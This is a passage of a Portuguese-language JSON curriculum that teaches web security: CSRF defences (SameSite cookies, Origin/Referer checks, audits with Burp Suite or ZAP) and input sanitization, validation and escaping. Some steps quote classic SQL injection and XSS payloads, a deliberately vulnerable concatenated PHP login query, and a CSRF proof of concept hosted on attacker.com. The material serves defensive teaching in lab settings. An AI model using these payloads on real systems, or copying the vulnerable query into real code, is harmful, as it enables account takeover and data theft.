                                "Relatório documenta verificações com evidências (screenshots/logs).",
                                "Integração de HttpOnly/Secure além de SameSite.",
                                "Recomendações personalizadas por contexto de app."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web: Manipulação de HTTP headers e cookies.",
                                "Segurança de Redes: Entendimento de same-origin policy e CORS.",
                                "Testes de Software: Uso de DevTools para depuração de rede.",
                                "Programação Backend: Implementação em Node.js/PHP/Apache.",
                                "Ética em Cibersegurança: Simulação ética de ataques CSRF."
                              ],
                              "realWorldApplication": "Em plataformas como bancos online (ex: Nubank), SameSite=Strict em cookies de sessão previne CSRF em transferências via links maliciosos em emails phishing, reduzindo riscos de fraudes financeiras sem necessidade de tokens extras em todos os forms."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.3.3.3",
                            "name": "Validar cabeçalhos de origem e referer",
                            "description": "Implementar verificações de cabeçalhos Origin, Referer e Host no servidor para garantir que requisições provenham do domínio esperado, discutindo limitações como proxies e HTTPS.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Cabeçalhos HTTP Origin, Referer e Host",
                                  "subSteps": [
                                    "Ler documentação oficial (MDN Web Docs e RFCs 6454 para Origin, 7231 para Referer e Host)",
                                    "Identificar quando cada cabeçalho é enviado pelo navegador (ex: Origin em requisições cross-origin, Referer em navegação)",
                                    "Comparar diferenças: Origin é domínio exato, Referer é URL completa, Host é do servidor",
                                    "Analisar cenários de ausência (ex: navegação direta, privacidade DNT)",
                                    "Mapear como proxies e HTTPS afetam esses cabeçalhos"
                                  ],
                                  "verification": "Escrever um resumo de 1 parágrafo por cabeçalho explicando propósito, envio e limitações",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "MDN Web Docs: HTTP Headers",
                                    "RFC 6454 (Origin)",
                                    "RFC 7231 (Referer)",
                                    "Ferramenta de inspeção de rede como DevTools"
                                  ],
                                  "tips": "Use o DevTools do navegador para observar cabeçalhos em requisições reais",
                                  "learningObjective": "Dominar o comportamento e limitações dos cabeçalhos para validação eficaz",
                                  "commonMistakes": [
                                    "Assumir que cabeçalhos sempre são enviados",
                                    "Confundir Origin (sempre presente em CORS) com Referer (pode ser suprimido)",
                                    "Ignorar que Host é do servidor, não cliente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir Domínio Esperado e Lógica de Validação",
                                  "subSteps": [
                                    "Listar domínios permitidos (ex: ['meudominio.com', 'www.meudominio.com'])",
                                    "Extrair domínio do cabeçalho (normalizar para lowercase, remover porta)",
                                    "Definir regras: checar pelo menos um cabeçalho presente e matching; fallback para qualquer se ausente",
                                    "Planejar tratamento de erros: logar falhas, retornar 403 Forbidden",
                                    "Considerar múltiplos cabeçalhos: priorizar Origin > Referer > Host"
                                  ],
                                  "verification": "Criar pseudocódigo ou fluxograma da lógica de validação",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Papel ou ferramenta como Draw.io para fluxograma",
                                    "Documentação OWASP CSRF"
                                  ],
                                  "tips": "Sempre normalize domínios para evitar case-sensitive issues",
                                  "learningObjective": "Criar regras robustas que balanceiem segurança e usabilidade",
                                  "commonMistakes": [
                                    "Lista rígida de domínios sem subdomínios",
                                    "Não tratar ausência como suspeita",
                                    "Permitir wildcards amplos como '*.com'"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Verificação no Servidor Web",
                                  "subSteps": [
                                    "Configurar middleware no servidor (ex: Express.js: req.headers.origin, req.headers.referer)",
                                    "Codificar função de validação: parsear e comparar com lista permitida",
                                    "Integrar no endpoint sensível (ex: POST /transferencia)",
                                    "Adicionar logs para depuração (ex: console.log(req.headers))",
                                    "Testar localmente com curl ou Postman simulando cabeçalhos"
                                  ],
                                  "verification": "Executar código e confirmar que requisições inválidas retornam 403",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Node.js/Express ou framework similar",
                                    "Postman ou curl",
                                    "Editor de código como VS Code"
                                  ],
                                  "tips": "Use req.get('Origin') para case-insensitive; sanitize inputs",
                                  "learningObjective": "Implementar código funcional e seguro para validação de cabeçalhos",
                                  "commonMistakes": [
                                    "Não decodificar URL-encoded em Referer",
                                    "Esquecer checagem em HTTPS (scheme mismatch)",
                                    "Expor headers sensíveis nos logs"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar Compreensivamente e Analisar Limitações",
                                  "subSteps": [
                                    "Testar cenários válidos/inválidos: domínios corretos, cross-origin, sem cabeçalhos",
                                    "Simular proxies (ex: via browser extensions ou nginx proxy)",
                                    "Verificar em HTTPS vs HTTP; testar com VPNs",
                                    "Documentar limitações: proxies deletam headers, apps mobile podem omitir",
                                    "Planejar complementos: combinar com CSRF tokens"
                                  ],
                                  "verification": "Relatório de testes com screenshots de falhas/sucessos e lista de limitações",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Postman collections",
                                    "Browser extensions como ModHeader",
                                    "Servidor local com HTTPS (mkcert)"
                                  ],
                                  "tips": "Combine com Samesite cookies para defesa em profundidade",
                                  "learningObjective": "Avaliar eficácia real e quando usar como camada secundária",
                                  "commonMistakes": [
                                    "Declarar 100% seguro sem testes de proxy",
                                    "Ignorar que Referer é bloqueado em cross-site por browsers modernos",
                                    "Não testar em produção-like env"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma API bancária Node.js/Express para endpoint POST /transfer-funds, implementar middleware que checa if (!isValidDomain(req.headers.origin || req.headers.referer)) return res.status(403).send('CSRF detected'); testando com Postman de bank.com (OK) vs attacker.com (bloqueado).",
                              "finalVerifications": [
                                "Código middleware valida corretamente domínios permitidos e rejeita inválidos",
                                "Testes com DevTools/Postman mostram bloqueio em cross-origin sem headers",
                                "Relatório lista 3+ limitações (proxies, HTTPS redirects, mobile apps)",
                                "Logs capturam tentativas suspeitas sem expor dados sensíveis",
                                "Integração com CSRF token como fallback demonstrada",
                                "Fluxograma da lógica cobre todos cenários de headers"
                              ],
                              "assessmentCriteria": [
                                "Precisão na extração e comparação de domínios (case/port insensitive)",
                                "Tratamento robusto de headers ausentes ou malformados (graceful 403)",
                                "Cobertura de testes: 80%+ cenários incluindo edge cases",
                                "Análise de limitações com mitigações sugeridas (ex: tokens)",
                                "Código limpo, comentado e sem vazamentos de segurança",
                                "Tempo de resposta não degradado por validação"
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web: Manipulação de HTTP em frameworks como Express/Django",
                                "Redes de Computadores: Entendimento profundo de headers e proxies",
                                "Segurança da Informação: OWASP Top 10 (CSRF) e defesas em camadas",
                                "Programação Full-Stack: Integração front-end (CORS) com back-end",
                                "Compliance e Governança: Conformidade com GDPR (Referer privacy)"
                              ],
                              "realWorldApplication": "Bancos como Nubank e plataformas e-commerce (Shopify) usam validação de Origin/Referer como camada extra contra CSRF em endpoints críticos como pagamentos, combinada com tokens Samesite=Strict, mitigando ataques mesmo em cenários de proxy/VPN comuns."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.2.1"
                            ]
                          },
                          {
                            "id": "10.1.4.3.3.4",
                            "name": "Auditar aplicações para CSRF",
                            "description": "Desenvolver checklist para auditoria de vulnerabilidades CSRF em código-fonte, incluindo análise estática de formulários e testes dinâmicos com ferramentas como Burp Suite ou OWASP ZAP.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Desenvolver Checklist Completa para Auditoria CSRF",
                                  "subSteps": [
                                    "Estude as diretrizes OWASP para CSRF, focando em pontos como tokens anti-CSRF, SameSite cookies e verificações de origem.",
                                    "Liste itens obrigatórios: presença de tokens em formulários POST/PUT/DELETE, validação de tokens no servidor, proteção em AJAX/SPA.",
                                    "Inclua verificações para frameworks comuns (ex: Spring CSRF, Django CSRF middleware).",
                                    "Adicione itens para análise estática (código) e dinâmica (runtime).",
                                    "Revise e priorize itens por risco (alto, médio, baixo)."
                                  ],
                                  "verification": "Checklist documentada em formato Markdown ou Excel com pelo menos 20 itens categorizados e referenciada à OWASP.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Documentação OWASP CSRF Cheat Sheet",
                                    "Editor de texto (VS Code)",
                                    "Exemplos de código vulnerável (DVWA ou OWASP Juice Shop)"
                                  ],
                                  "tips": "Use templates prontos da OWASP como base e customize para o stack tecnológico alvo.",
                                  "learningObjective": "Criar uma checklist abrangente que cubra 95% das vulnerabilidades CSRF comuns.",
                                  "commonMistakes": [
                                    "Ignorar requests AJAX ou APIs REST",
                                    "Não considerar customizações de frameworks",
                                    "Focar só em GET/POST sem checar métodos state-changing"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Realizar Análise Estática do Código-Fonte",
                                  "subSteps": [
                                    "Clone ou acesse o repositório do código-fonte da aplicação alvo.",
                                    "Procure por formulários HTML (action POST/PUT/DELETE) e verifique presença de <input type='hidden' name='_csrf'> ou similar.",
                                    "Analise código servidor: busque validação de tokens CSRF em controllers/endpoints.",
                                    "Verifique headers como X-CSRF-Token em APIs e SameSite=Strict/Lax em cookies de sessão.",
                                    "Use ferramentas como grep ou IDE search para padrões como 'csrf_token' ou 'synchronizer'.'"
                                  ],
                                  "verification": "Relatório de análise estática com screenshots de código vulnerável/seguro e marcações no checklist.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "IDE (VS Code, IntelliJ)",
                                    "Repositório Git da app (ex: app vulnerável)",
                                    "Ferramentas de grep (grep, ripgrep)",
                                    "OWASP CSRF Prevention Cheat Sheet"
                                  ],
                                  "tips": "Combine busca por regex como 'method=[\"|\\]POST' com revisão manual para contexto.",
                                  "learningObjective": "Identificar manualmente pontos fracos CSRF no código sem executar a app.",
                                  "commonMistakes": [
                                    "Não checar código cliente-side JS para bypass",
                                    "Ignorar configurações de framework",
                                    "Confundir tokens de autenticação com CSRF"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar e Executar Testes Dinâmicos com Burp Suite ou OWASP ZAP",
                                  "subSteps": [
                                    "Instale e configure Burp Suite ou OWASP ZAP como proxy interceptador.",
                                    "Navegue pela app, capture tráfego e identifique requests state-changing sem tokens CSRF.",
                                    "Crie PoC de ataque: hospede HTML malicioso em outro domínio e tente submeter formulários cross-site.",
                                    "Teste bypasses: remova tokens, use CORS malicioso, cheque SameSite cookies.",
                                    "Repita para múltiplos fluxos (login, checkout, admin panels)."
                                  ],
                                  "verification": "Capturas de tela de requests bem-sucedidos falhando com CSRF PoC e checklist atualizado com resultados dinâmicos.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Burp Suite Community ou OWASP ZAP (gratuito)",
                                    "Navegador com proxy (Firefox/Chrome)",
                                    "Servidor local para PoC HTML malicioso",
                                    "App alvo rodando localmente"
                                  ],
                                  "tips": "Use Repeater no Burp para manipular requests rapidamente; grave sessões para replay.",
                                  "learningObjective": "Demonstrar exploração prática de CSRF e validar proteções em runtime.",
                                  "commonMistakes": [
                                    "Proxy mal configurado causando falhas de login",
                                    "Não invalidar sessão entre testes",
                                    "Esquecer de testar em modo autenticado"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Resultados, Documentar e Recomendar Correções",
                                  "subSteps": [
                                    "Compile achados: liste vulnerabilidades encontradas com severidade (CVSS-like).",
                                    "Gere relatório: inclua checklist preenchido, evidências (screenshots, logs) e PoCs.",
                                    "Recomende fixes: implementar tokens synchronizer, SameSite cookies, custom headers.",
                                    "Valide correções: re-teste após simular fixes.",
                                    "Arquive relatório com timestamps e hash para auditoria."
                                  ],
                                  "verification": "Relatório final PDF/MD com executive summary, achados, recomendações e status de remediação.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Ferramenta de relatório (Markdown to PDF, Google Docs)",
                                    "Templates de relatório de pentest",
                                    "CVSS calculator online"
                                  ],
                                  "tips": "Estruture relatório como: Intro > Metodologia > Achados > Recomendações > Anexos.",
                                  "learningObjective": "Transformar auditoria em ação: relatório acionável para devs/gerentes.",
                                  "commonMistakes": [
                                    "Relatório vago sem evidências",
                                    "Recomendações genéricas sem contexto",
                                    "Não priorizar por impacto de negócio"
                                  ]
                                }
                              ],
                              "practicalExample": "Ao auditar um e-commerce como o OWASP Juice Shop, desenvolva checklist para checkout form. Na análise estática, note ausência de CSRF token no /api/cart endpoint. Dinamicamente, use Burp para capturar request sem token, crie PoC HTML em attacker.com que submete carrinho vazio roubando itens do usuário logado.",
                              "finalVerifications": [
                                "Checklist cobre 100% dos itens OWASP CSRF Prevention.",
                                "Análise estática identifica todos formulários state-changing.",
                                "Testes dinâmicos incluem PoC reproduzível de exploração CSRF.",
                                "Relatório lista achados com evidências e severidades.",
                                "Recomendações incluem fixes específicos (ex: @CsrfProtect em Spring).",
                                "Re-teste confirma ausência de falsos positivos/negativos."
                              ],
                              "assessmentCriteria": [
                                "Completude da checklist (20%)",
                                "Precisão da análise estática (25%)",
                                "Qualidade dos testes dinâmicos e PoCs (30%)",
                                "Clareza e estrutura do relatório (15%)",
                                "Validade das recomendações e re-testes (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web: Entender HTML forms, JS fetch e server-side validation.",
                                "Testes de Software: Integração com SAST/DAST tools.",
                                "Ética e Compliance: Conformidade com OWASP Top 10 e GDPR.",
                                "Análise de Riscos: Cálculo de impacto negócio em breaches CSRF."
                              ],
                              "realWorldApplication": "Em pentests profissionais para bancos ou e-commerces, essa auditoria previne ataques CSRF que permitem ações não autorizadas como transferências fraudulentas, custando milhões (ex: casos reais em Magento e Rails apps)."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.3.1"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.4.4",
                    "name": "Mecanismos de Prevenção de Ataques Web",
                    "description": "Técnicas como sanitização de entradas, tokens anti-CSRF e Content Security Policy (CSP).",
                    "individualConcepts": [
                      {
                        "id": "10.1.4.4.1",
                        "name": "Sanitização de Entradas",
                        "description": "Técnica essencial para validar e limpar dados fornecidos pelo usuário, prevenindo ataques de injeção como SQL Injection e Cross-Site Scripting (XSS) ao remover ou escapar caracteres maliciosos.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.4.1.1",
                            "name": "Compreender vulnerabilidades de entradas não sanitizadas",
                            "description": "Identificar como entradas maliciosas exploram falhas em aplicações web, exemplificando ataques SQL Injection e XSS com payloads reais e impactos em sistemas reais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender conceitos básicos de sanitização de entradas",
                                  "subSteps": [
                                    "Defina o que são entradas de usuário em aplicações web (formulários, URLs, cookies).",
                                    "Explique sanitização: processo de limpeza e validação de dados de entrada.",
                                    "Discuta riscos de entradas não sanitizadas: injeção de código malicioso.",
                                    "Compare entrada sanitizada vs. não sanitizada com diagramas simples.",
                                    "Identifique tipos comuns de entradas vulneráveis (cadastro, login, busca)."
                                  ],
                                  "verification": "Crie um fluxograma mostrando o fluxo de uma entrada não sanitizada causando dano.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Navegador web",
                                    "Papel e caneta para diagramas",
                                    "Documentação OWASP sobre injeções"
                                  ],
                                  "tips": "Sempre pense em entradas como potencialmente maliciosas; valide no lado servidor.",
                                  "learningObjective": "Compreender o papel da sanitização na prevenção de exploits.",
                                  "commonMistakes": [
                                    "Confundir sanitização com validação",
                                    "Achar que cliente-side é suficiente",
                                    "Ignorar entradas indiretas como headers"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar SQL Injection (SQLi)",
                                  "subSteps": [
                                    "Descreva SQLi: injeção de SQL malicioso em queries dinâmicas.",
                                    "Analise payload clássico: ' OR '1'='1' -- para bypass de login.",
                                    "Simule em ambiente controlado (ex: DVWA ou SQLi lab).",
                                    "Identifique impactos: dump de DB, alteração/deleção de dados.",
                                    "Estude variantes: blind, time-based, union-based."
                                  ],
                                  "verification": "Execute um payload SQLi em lab e liste dados extraídos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "DVWA ou SQLmap",
                                    "Servidor local com MySQL",
                                    "Tutoriais PortSwigger WebSec Academy"
                                  ],
                                  "tips": "Use prepared statements como PDO para mitigar; nunca concatene strings em queries.",
                                  "learningObjective": "Identificar e demonstrar ataques SQLi com payloads reais.",
                                  "commonMistakes": [
                                    "Não usar labs isolados (risco real)",
                                    "Confundir SQLi com outros injections",
                                    "Subestimar impactos em DBs sensíveis"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Cross-Site Scripting (XSS)",
                                  "subSteps": [
                                    "Defina XSS: injeção de scripts maliciosos em páginas web visualizadas por usuários.",
                                    "Classifique tipos: reflected, stored, DOM-based.",
                                    "Teste payloads: <script>alert('XSS')</script> ou <img src=x onerror=alert(1)>.",
                                    "Analise impactos: roubo de cookies, keylogging, phishing.",
                                    "Simule em lab vulnerável."
                                  ],
                                  "verification": "Injete XSS em lab e capture um cookie simulado.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "DVWA ou XSS labs online",
                                    "Burp Suite Community (opcional)",
                                    "OWASP XSS Cheat Sheet"
                                  ],
                                  "tips": "Escape outputs com HTML entities; use CSP (Content Security Policy).",
                                  "learningObjective": "Reconhecer payloads XSS e seus efeitos em sessões de usuário.",
                                  "commonMistakes": [
                                    "Ignorar XSS stored (persistente)",
                                    "Testar só em localhost",
                                    "Confundir com CSRF"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar impactos reais e práticas de identificação",
                                  "subSteps": [
                                    "Revise casos reais: brechas como Yahoo (SQLi) ou MySpace (XSS worm).",
                                    "Identifique padrões em código vulnerável (ex: mysqli_query com user input).",
                                    "Pratique detecção: revise snippets de código PHP/Node.js.",
                                    "Discuta mitigações gerais: input validation, output encoding, WAF.",
                                    "Crie checklist para auditoria de entradas."
                                  ],
                                  "verification": "Audite um código exemplo e liste 3 vulnerabilidades encontradas.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Exemplos de código vulnerável no GitHub",
                                    "Relatórios de brechas (ex: OWASP Top 10)",
                                    "Editor de texto"
                                  ],
                                  "tips": "Procure por concatenação direta de inputs em queries ou HTML; use linters de segurança.",
                                  "learningObjective": "Avaliar vulnerabilidades em contextos reais e propor defesas.",
                                  "commonMistakes": [
                                    "Focar só em ataques sem mitigações",
                                    "Generalizar todos os inputs como seguros",
                                    "Não considerar chains de ataques"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um formulário de login PHP vulnerável: $query = \"SELECT * FROM users WHERE user='$user' AND pass='$pass'\"; insira user: admin' OR '1'='1' -- para logar como admin sem senha, expondo todos os usuários do banco.",
                              "finalVerifications": [
                                "Explique a diferença entre SQLi e XSS com exemplos de payloads.",
                                "Identifique 3 impactos de cada vulnerabilidade em um e-commerce.",
                                "Simule um ataque em lab e documente passos + resultados.",
                                "Liste 3 mitigações OWASP para entradas não sanitizadas.",
                                "Audite um snippet de código e classifique riscos.",
                                "Descreva um caso real de brecha por input não sanitizado."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de payloads SQLi/XSS (90% acerto).",
                                "Demonstração prática em labs com screenshots/evidências.",
                                "Explicação clara de impactos em sistemas reais.",
                                "Proposta de mitigações específicas e justificadas.",
                                "Checklist de auditoria completa e acionável.",
                                "Compreensão de variantes avançadas (ex: blind SQLi)."
                              ],
                              "crossCurricularConnections": [
                                "Programação Web (PHP, JavaScript, SQL para implementação).",
                                "Ética e Direito Digital (leis de proteção de dados como LGPD/GDPR).",
                                "Desenvolvimento de Software (boas práticas de coding seguro).",
                                "Análise de Dados (impacto em integridade de bancos).",
                                "Redes e Sistemas (integração com WAF e monitoramento)."
                              ],
                              "realWorldApplication": "Em bancos online, prevenir SQLi evita vazamento de dados de milhões de clientes (ex: brecha Capital One 2019); em redes sociais, mitigar XSS impede roubo de sessões e worms como o Samy no MySpace, protegendo privacidade e reputação."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.4.1.2",
                            "name": "Aplicar validação de tipos e comprimento",
                            "description": "Implementar regras de validação para tipos de dados (ex.: email, números), comprimento máximo e padrões regex em linguagens como PHP, JavaScript e Python para bloquear entradas inválidas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de Validação de Tipos e Comprimento",
                                  "subSteps": [
                                    "Estude tipos de dados comuns: strings, números, emails e senhas.",
                                    "Aprenda funções nativas para checar tipos (typeof em JS, is_string em PHP, isinstance em Python).",
                                    "Pratique verificação de comprimento com funções como strlen, length e len.",
                                    "Identifique casos de uso: bloquear entradas vazias ou excessivamente longas.",
                                    "Crie pseudocódigo para validação básica de email e número."
                                  ],
                                  "verification": "Escreva e execute um script simples que valida tipo e comprimento de uma string de teste, retornando true/false.",
                                  "estimatedTime": "30 minutes",
                                  "materials": [
                                    "Editor de código (VS Code)",
                                    "Documentação oficial: MDN JS, PHP Manual, Python docs"
                                  ],
                                  "tips": [
                                    "Comece com validações simples antes de regex.",
                                    "Use asserts ou console.log para debug."
                                  ],
                                  "learningObjective": "Dominar conceitos básicos de checagem de tipo e tamanho de entrada para prevenir injeções inválidas.",
                                  "commonMistakes": [
                                    "Confundir validação de tipo com conversão implícita.",
                                    "Ignorar comprimentos zero ou negativos.",
                                    "Não considerar caracteres multibyte em strings."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Validação com Regex para Padrões Específicos",
                                  "subSteps": [
                                    "Estude sintaxe regex básica: ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$ para email.",
                                    "Crie padrões para números (\\d+), senhas (mín. 8 chars com maiúscula, número).",
                                    "Teste regex em ferramentas online como regex101.com.",
                                    "Integre regex com checagem de tipo e comprimento (ex.: max 255 chars para email).",
                                    "Pratique matching e replacement para sanitização básica."
                                  ],
                                  "verification": "Desenvolva 3 regex testes que validam email, número inteiro e senha, com 100% de acerto em casos de teste.",
                                  "estimatedTime": "45 minutes",
                                  "materials": [
                                    "Regex101.com",
                                    "Editor com suporte regex (VS Code extensions)"
                                  ],
                                  "tips": [
                                    "Use flags como i para case-insensitive.",
                                    "Escape caracteres especiais sempre."
                                  ],
                                  "learningObjective": "Aplicar expressões regulares para validação precisa de formatos de entrada como emails e senhas.",
                                  "commonMistakes": [
                                    "Regex muito permissivos permitindo injeções.",
                                    "Não testar edge cases como emails com + ou números com decimais.",
                                    "Overcomplicar padrões desnecessariamente."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Validação em JavaScript (Client-Side)",
                                  "subSteps": [
                                    "Crie função validateInput(type, value, maxLength) usando typeof e test().",
                                    "Aplique em formulário HTML: onsubmit com event.preventDefault().",
                                    "Valide email com regex, números com isNaN(), comprimento com value.length.",
                                    "Exiba erros customizados via DOM manipulation.",
                                    "Teste com inputs inválidos como 'abc@' ou senhas curtas."
                                  ],
                                  "verification": "Formulário rejeita 5 inputs inválidos e aceita 3 válidos, com mensagens de erro visíveis.",
                                  "estimatedTime": "40 minutes",
                                  "materials": [
                                    "HTML/JS boilerplate",
                                    "Browser dev tools"
                                  ],
                                  "tips": [
                                    "Valide client-side para UX, mas sempre server-side para segurança.",
                                    "Use HTML5 validation como fallback."
                                  ],
                                  "learningObjective": "Desenvolver validação robusta em JS para interfaces web seguras.",
                                  "commonMistakes": [
                                    "Confiar só em client-side (bypassável).",
                                    "Não sanitizar após validar.",
                                    "Ignorar mobile input patterns."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Validação em PHP e Python (Server-Side)",
                                  "subSteps": [
                                    "Em PHP: Use filter_var(FILTER_VALIDATE_EMAIL), preg_match para regex, strlen.",
                                    "Em Python: Use re.match, isinstance(int, value), len(value).",
                                    "Crie funções reutilizáveis: validate_email($input), validate_length($input, max).",
                                    "Integre em script de processamento de POST/GET.",
                                    "Log entradas inválidas para auditoria."
                                  ],
                                  "verification": "Scripts PHP/Python processam 10 casos de teste, rejeitando inválidos e logando sucessos.",
                                  "estimatedTime": "50 minutes",
                                  "materials": [
                                    "Servidor local (XAMPP para PHP)",
                                    "Python interpreter"
                                  ],
                                  "tips": [
                                    "Sempre valide server-side independentemente do client.",
                                    "Use prepared statements pós-validação."
                                  ],
                                  "learningObjective": "Implementar validações server-side em PHP e Python para bloquear ataques web.",
                                  "commonMistakes": [
                                    "Não escapar outputs pós-validação.",
                                    "Permitir unicode oversized strings.",
                                    "Esquecer validação em arrays de inputs."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar, Integrar e Otimizar Validações Multi-Linguagem",
                                  "subSteps": [
                                    "Crie suite de testes unitários (Jest para JS, PHPUnit, pytest).",
                                    "Integre validações em app full-stack simples (formulário JS -> PHP/Python backend).",
                                    "Otimize performance: cache regex compilados.",
                                    "Teste edge cases: SQL-like strings, XSS payloads.",
                                    "Documente funções com exemplos."
                                  ],
                                  "verification": "App full-stack passa todos testes sem vazamentos de inputs inválidos.",
                                  "estimatedTime": "35 minutes",
                                  "materials": [
                                    "Ferramentas de teste: Jest, PHPUnit, pytest",
                                    "Burp Suite ou Postman para simular ataques"
                                  ],
                                  "tips": [
                                    "Automatize testes para CI/CD.",
                                    "Combine validação com sanitização (htmlspecialchars, etc.)."
                                  ],
                                  "learningObjective": "Garantir validações seguras e escaláveis em ecossistemas multi-linguagem.",
                                  "commonMistakes": [
                                    "Testes insuficientes para payloads maliciosos.",
                                    "Performance hit com regex não otimizados.",
                                    "Falta de logging para forensics."
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um formulário de registro de usuário com campos email (válido regex, max 100 chars), senha (min 8 chars, 1 maiúscula, 1 número) e idade (número positivo). Valide no client (JS), server (PHP) e alternativo (Python API), rejeitando 'test@invalid' ou senhas 'abc'.",
                              "finalVerifications": [
                                "Todos inputs inválidos são bloqueados com mensagens claras.",
                                "Inputs válidos processam sem erros ou warnings.",
                                "Regex e checagens de tipo/comprimento cobrem 100% dos casos de teste.",
                                "Logs registram tentativas inválidas para auditoria.",
                                "Integração full-stack não permite bypass client-side.",
                                "Performance mantém <50ms por validação."
                              ],
                              "assessmentCriteria": [
                                "Precisão: 95%+ taxa de detecção de inválidos sem falsos positivos.",
                                "Cobertura: Valida tipos, comprimento e padrões em 3 linguagens.",
                                "Segurança: Bloqueia payloads de SQLi/XSS via validação estrita.",
                                "Eficiência: Código limpo, reutilizável com funções modulares.",
                                "Documentação: Comentários e testes explicam lógica.",
                                "Robustez: Lida com edge cases como empty, null, oversized."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Uso de funções condicionais, loops e expressões regulares.",
                                "Matemática: Lógica de padrões e automatos finitos em regex.",
                                "Cibersegurança: Integração com OWASP Top 10 (A03: Injection, A07: XSS).",
                                "Desenvolvimento Web: Client-server architecture e APIs REST.",
                                "Qualidade de Software: Testes unitários e TDD."
                              ],
                              "realWorldApplication": "Em plataformas e-commerce como Shopify ou bancos online, valida entradas de formulários para prevenir injeções SQL/XSS, garantindo conformidade GDPR ao rejeitar dados oversized e formatos inválidos, reduzindo breaches em 80% conforme OWASP benchmarks."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.4.1.3",
                            "name": "Utilizar escaping e bibliotecas de sanitização",
                            "description": "Aplicar funções de escaping como htmlspecialchars() em PHP ou OWASP ESAPI, e bibliotecas como DOMPurify para JavaScript, testando em cenários de formulários web.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de Escaping e Sanitização",
                                  "subSteps": [
                                    "Estude a diferença entre escaping (codificação de caracteres especiais) e sanitização (remoção ou neutralização de conteúdo malicioso).",
                                    "Analise exemplos de ataques XSS (Cross-Site Scripting) causados por entradas não sanitizadas.",
                                    "Revise flags comuns do htmlspecialchars() no PHP, como ENT_QUOTES e ENT_HTML5.",
                                    "Explore documentação da OWASP ESAPI e DOMPurify para entender seus métodos principais.",
                                    "Identifique contextos de uso: HTML, atributos HTML, JavaScript, CSS e URL."
                                  ],
                                  "verification": "Resuma em um documento as diferenças entre escaping e sanitização, listando 3 exemplos de XSS e como mitigá-los.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação PHP htmlspecialchars()",
                                    "OWASP XSS Prevention Cheat Sheet",
                                    "Site oficial DOMPurify"
                                  ],
                                  "tips": "Use um playground online como JSFiddle para testar payloads XSS rapidamente.",
                                  "learningObjective": "Dominar os conceitos teóricos para aplicar escaping corretamente em diferentes contextos.",
                                  "commonMistakes": [
                                    "Confundir escaping com validação de entrada.",
                                    "Ignorar o contexto de saída (ex: escaping HTML em JS).",
                                    "Não considerar codificações de caracteres como UTF-8."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Escaping em PHP com htmlspecialchars() e OWASP ESAPI",
                                  "subSteps": [
                                    "Crie um script PHP simples com um formulário que recebe input do usuário.",
                                    "Aplique htmlspecialchars($input, ENT_QUOTES, 'UTF-8') na saída para contexto HTML.",
                                    "Instale OWASP ESAPI via Composer e use encodeForHTML() em um exemplo similar.",
                                    "Teste com payloads XSS como <script>alert('XSS')</script> antes e depois do escaping.",
